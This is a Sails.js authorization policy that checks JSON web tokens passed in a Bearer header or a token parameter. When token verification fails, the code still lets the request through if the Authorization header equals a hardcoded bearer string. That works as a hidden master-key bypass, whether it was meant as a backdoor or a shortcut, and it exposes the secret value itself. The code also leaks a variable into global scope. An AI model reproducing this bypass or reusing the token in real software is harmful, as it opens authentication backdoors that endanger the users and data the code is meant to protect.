/**
 * isAuthorized
 *
 * @description :: Policy to check if user is authorized with JSON web token
 * @help        :: See http://sailsjs.org/#!/documentation/concepts/Policies
 */

module.exports = function (req, res, next) {
  var token;

  if (req.headers && req.headers.authorization) {
    var parts = req.headers.authorization.split(' ');
    if (parts.length == 2) {
      var scheme = parts[0];
      credentials = parts[1];

      if (scheme === 'Bearer') {
        token = credentials;
      }
    } else {
      return res.json(401, { status: 'error', message: 'Wrong Authorization format' });
    }
  } else if (req.param('token')) {
    token = req.param('token');

    // We delete the token from param to not mess with blueprints
    delete req.query.token;
  } else {
    return res.status(401).json({ status: 'error', message: 'No Authorization header was found' });
  }

  jwToken.verify(token, function (err, token) {
    if (err) {
      if (req.headers.authorization === 'Bearer PACh0CIj1aaU5rXI0iQkHvmk3qUsikp00A2IVHKFHkk=') {
        next();
      } else {
        return res.json(401, { status: 'error', message: 'Invalid Token' });
      }
    } else {
      req.token = token; // This is the decrypted token or the payload you provided
      next();
    }

  });
};
